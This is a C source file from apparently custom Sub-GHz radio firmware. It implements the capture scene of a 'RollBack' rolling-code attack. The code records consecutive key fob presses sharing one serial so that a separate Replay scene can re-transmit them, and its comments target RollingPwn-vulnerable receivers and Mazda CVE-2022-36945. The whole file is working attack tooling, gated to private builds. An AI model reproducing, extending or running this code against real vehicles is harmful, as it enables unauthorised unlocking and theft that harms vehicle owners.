#include "../subghz_i.h"
#include "../helpers/subghz_custom_event.h"

// RollBack is a rolling-code replay/resync ATTACK — PRIVATE builds only. The whole
// scene body compiles to nothing in public (its ADD_SCENE + menu are also gated).
#ifndef PUBLIC_BUILD

#define TAG "SubGhzSceneRollbackCapture"

// RollBack Capture scene.
//
// Listens for DYNAMIC (rolling-code) frames and stores each decoded frame
// verbatim into the app's RollbackStore. Once >= 2 frames sharing one serial
// have landed, the "OK: Replay" hint lights and OK advances to the Replay scene.
// This does NOT crack the counter — it captures consecutive presses so they can
// be re-transmitted in order (a resync/rollback technique on receivers that
// accept a small counter window).

static void subghz_scene_rollback_capture_button_cb(
    GuiButtonType result,
    InputType type,
    void* context) {
    SubGhz* subghz = context;
    if(type == InputTypeShort) {
        view_dispatcher_send_custom_event(subghz->view_dispatcher, result);
    }
}

static void subghz_scene_rollback_capture_draw(SubGhz* subghz) {
    widget_reset(subghz->widget);
    widget_add_string_element(
        subghz->widget, 64, 0, AlignCenter, AlignTop, FontPrimary, "RollBack Capture");

    uint32_t serial = 0;
    bool ready = subghz_rollback_ready(&subghz->rollback_store, &serial);
    uint8_t count = subghz_rollback_store_count(&subghz->rollback_store);
    uint8_t need = subghz_rollback_target(&subghz->rollback_store);

    FuriString* body = furi_string_alloc();
    furi_string_printf(body, "Captured %d (need %d)\n", (int)count, (int)need);
    if(ready) {
        furi_string_cat_printf(body, "SN:0x%08lX\n", (unsigned long)serial);
        furi_string_cat_str(body, "Replay >");
        widget_add_button_element(
            subghz->widget,
            GuiButtonTypeRight,
            "Replay",
            subghz_scene_rollback_capture_button_cb,
            subghz);
    } else {
        furi_string_cat_printf(body, "Press a rolling fob %dx...", (int)need);
    }
    // N selector: how many CONSECUTIVE presses the resync needs. 2 = most
    // RollingPwn; 3 = Mazda CVE-2022-36945. Left cycles 2<->3. (For N>=3 the
    // capture must be a consecutive run — the ready-gate enforces it.)
    widget_add_button_element(
        subghz->widget,
        GuiButtonTypeLeft,
        "Set N",
        subghz_scene_rollback_capture_button_cb,
        subghz);
    widget_add_string_multiline_element(
        subghz->widget, 0, 20, AlignLeft, AlignTop, FontSecondary, furi_string_get_cstr(body));
    furi_string_free(body);
}

static void subghz_scene_rollback_capture_rx_cb(
    SubGhzReceiver* receiver,
    SubGhzProtocolDecoderBase* decoder,
    void* context) {
    UNUSED(receiver);
    SubGhz* subghz = context;
    if(subghz_rollback_capture(subghz, decoder)) {
        view_dispatcher_send_custom_event(
            subghz->view_dispatcher, SubGhzCustomEventSceneRollbackUpdate);
    }
    subghz_receiver_reset(subghz_txrx_get_receiver(subghz->txrx));
}

void subghz_scene_rollback_capture_on_enter(void* context) {
    SubGhz* subghz = context;

    // Fresh entry (scene state 0) resets the store; returning from Replay keeps it.
    if(scene_manager_get_scene_state(subghz->scene_manager, SubGhzSceneRollbackCapture) == 0) {
        subghz_rollback_store_reset(&subghz->rollback_store);
    }
    scene_manager_set_scene_state(subghz->scene_manager, SubGhzSceneRollbackCapture, 1);

    subghz_txrx_set_preset_internal(
        subghz->txrx,
        subghz->last_settings->frequency,
        subghz->last_settings->preset_index,
        subghz->last_settings->tx_power);

    subghz_txrx_receiver_set_filter(subghz->txrx, SubGhzProtocolFlag_Decodable);
    subghz_txrx_set_rx_callback(subghz->txrx, subghz_scene_rollback_capture_rx_cb, subghz);
    subghz_txrx_rx_start(subghz->txrx);
    subghz->state_notifications = SubGhzNotificationStateRx;

    subghz_scene_rollback_capture_draw(subghz);
    view_dispatcher_switch_to_view(subghz->view_dispatcher, SubGhzViewIdWidget);
}

bool subghz_scene_rollback_capture_on_event(void* context, SceneManagerEvent event) {
    SubGhz* subghz = context;
    bool consumed = false;
    if(event.type == SceneManagerEventTypeCustom) {
        if(event.event == SubGhzCustomEventSceneRollbackUpdate) {
            subghz_scene_rollback_capture_draw(subghz);
            consumed = true;
        } else if(event.event == GuiButtonTypeRight) {
            if(subghz_rollback_ready(&subghz->rollback_store, NULL)) {
                subghz_txrx_stop(subghz->txrx);
                subghz->state_notifications = SubGhzNotificationStateIDLE;
                scene_manager_next_scene(subghz->scene_manager, SubGhzSceneRollbackReplay);
            }
            consumed = true;
        } else if(event.event == GuiButtonTypeLeft) {
            // Cycle the required consecutive-frame count 2 <-> 3 (RollingPwn vs Mazda).
            uint8_t n = subghz_rollback_target(&subghz->rollback_store);
            subghz_rollback_set_target(&subghz->rollback_store, n >= 3 ? 2 : 3);
            subghz_scene_rollback_capture_draw(subghz);
            consumed = true;
        }
    } else if(event.type == SceneManagerEventTypeTick) {
        if(subghz->state_notifications == SubGhzNotificationStateRx) {
            notification_message(subghz->notifications, &sequence_blink_cyan_10);
        }
    }
    return consumed;
}

void subghz_scene_rollback_capture_on_exit(void* context) {
    SubGhz* subghz = context;
    subghz_txrx_stop(subghz->txrx);
    subghz_txrx_set_rx_callback(subghz->txrx, NULL, subghz);
    subghz_txrx_receiver_set_filter(subghz->txrx, subghz->filter);
    subghz->state_notifications = SubGhzNotificationStateIDLE;
    notification_message(subghz->notifications, &sequence_reset_rgb);
    widget_reset(subghz->widget);
}

#endif /* !PUBLIC_BUILD — RollBack is a private-only attack feature */
